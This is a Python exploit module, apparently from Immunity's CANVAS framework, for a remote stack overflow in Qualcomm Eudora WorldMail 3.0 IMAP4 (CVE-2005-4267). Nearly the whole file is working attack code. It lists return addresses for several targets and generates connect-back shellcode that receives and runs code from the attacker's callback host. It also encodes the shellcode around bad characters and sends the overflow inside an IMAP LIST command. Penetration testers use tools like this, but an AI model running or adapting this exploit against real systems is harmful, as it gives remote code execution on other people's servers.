#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
if "." not in sys.path:
    sys.path.append(".")


from exploitutils import *
from tcpexploit import tcpexploit

# GUI info
NAME="WorldMail"
DESCRIPTION="Eudora Qualcomm WorldMail 3.0 IMAP4 stack overflow"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Qualcomm"
DOCUMENTATION["CVE Name"] = "CVE-2005-4267"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4267"
DOCUMENTATION['CVSS'] = 7.5
VERSION="0.1"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows" ] ]
PROPERTY['VERSION'] = [ "2000" ]

CHANGELOG="""

"""

NOTES="""



"""

# info, where, restore
targets = {
    0 : ["Autoversioning",  0],     
    1 : ["Eudora Qualcomm WorldMail 3.0", 0x60068A8B ], 
        # 60068A8B : jmp %ebx [MFldrMgr.dll] (IMAP4A.exe (PID: 1688))
    2 : ["Eudora Qualcomm WorldMail 3.2", 0x600FA3E3],
        # 600FA3E3 : jmp %ebx [MsccMgr.dll] (IMAP4A.exe (PID: 2260))
    3 : ["Eudora Qualcomm WorldMail on Windows 2000 SP4", 0x77E6F52B] 
        #77E6F52B : jmp %ebx [user32.dll] (IMAP4A.exe (PID: 2260))
}

# define these according to targets
WIN2K = 1
WINNT4 = 4

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name=NAME
        self.covertness = 0
        self.port = 143
        self.host = "192.168.0.6"
        self.localhost = "192.168.0.2"
        self.localport = 5555
        self.version = 0
        self.badstring = "\x00\n\r}\\{} '\"" #/.:$"# \\/.:$"
        self.versions = targets

        self.myDCE = None
        self.autoversion=0
        self.connectionList=[] #none to start, fill this in with buildConnectionList()
        self.subesp=0
        self.listenerArgsDict["fromcreatethread"] = 1
        self.stage2shellcode = ""
        return
    
    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]

    def createShellcode(self):
        host = self.callback.ip
        port = self.callback.port
        self.localhost = host
        self.localport = port
        self.INFO, self.ADDY= targets[self.version]

        from shellcode import shellcodeGenerator
        self.log("Creating shellcode to callback to %s:%s"%(host,port))
        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
        sc.addAttr("revert_to_self_before_importing_ws2_32", None)
        sc.addAttr("tcpconnect", {"port" : port, "ipaddress" : host})
        sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        sc.addAttr("ExitThread",None)

        rawshellcode = sc.get()
        if self.badstring=="":
            self.shellcode=rawshellcode
            return 1
        self.log("Raw shellcode (before encoding) is %d byte"%len(rawshellcode))        #set up the shellcode
        self.encodeshellcode(rawshellcode)
        return 1
    
    def encodeshellcode(self,rawshellcode):
        from encoder import chunkedaddencoder
        encoder=chunkedaddencoder.intelchunkedaddencoder()
        #encoder= xorencoder.simpleXOR()
        #key = encoder.find_key(rawshellcode)
        #encoder.setKey(key)
        #these are the characters not allowed by the exploit
        encoder.setbadstring(self.badstring)
        
        self.log( "Encoding shellcode. This may take a while if we don't find a good value in the cache.")
        shellcode=encoder.encode(rawshellcode)
        self.log( "Done encoding shellcode.")
        if shellcode=="":
            self.log( "Could not encode shellcode")
            return 0
        #debug int
        #shellcode="\xcc"+shellcode
        self.shellcode=shellcode
        return self.shellcode
                                                                                
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return self.bannerchecktest({"WorldMail IMAP4 Server 6.1.19.0":1,\
                                     "WorldMail 3 IMAP4 Server 6.1.22.0": 2})

    def exploitIT(self): 
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect( (self.host, self.port) )
        except:
            self.log("Could not connect...")
            return 0
        for a in hexdump(self.shellcode):
            print a
        if self.version == 0:
            self.test()
            if self.version == 0:
                self.log("Version not found, trying with the generic target Windows 2000 SP4")
                self.version = 3 
            self.INFO, self.ADDY= targets[self.version]

        print "Exploiting %d " % self.version
        
        from MOSDEF import mosdef
        print hex(len(self.shellcode))
        welcome = s.recv(500) # +  '}'* (0x50)
        s.send('02 LIST "' + "A" * (0x303-len(self.shellcode) )  + self.shellcode + "AA" + mosdef.assemble("jmp 4", "X86") + struct.pack("<L", self.ADDY) + mosdef.assemble("jmp $-0x310", "X86") +"A" * 0x400+  '}' + "\r\n")
        #buf = s.recv(5)
        return 1
    
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        #self.user=self.argsDict.get("user",self.user)
        #self.password=self.argsDict.get("password",self.password)        
        self.version = int(self.argsDict.get("version",self.version))
        self.setInfo("%s attacking %s:%d - (in progress)"% (self.name, self.host, self.port), showlog=True)
        self.log("Attacked version: %s" % self.INFO)
        
        self.setProgress(25)
        self.exploitIT()
        self.log("Sleeping one second so server can recover")
        import time
        time.sleep(1) 
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d (succeeded!)"%(self.name,self.host,self.port), showlog=True)
            self.log("%s done (succeeded!)"%self.name)
            return 1
            
        return 0
    

    def displayVersions(self):
        i = 0
        for listline in targets.values():
            print "%d : %s"% (i, listline[0])
            i = i + 1
    
if __name__== '__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)


    
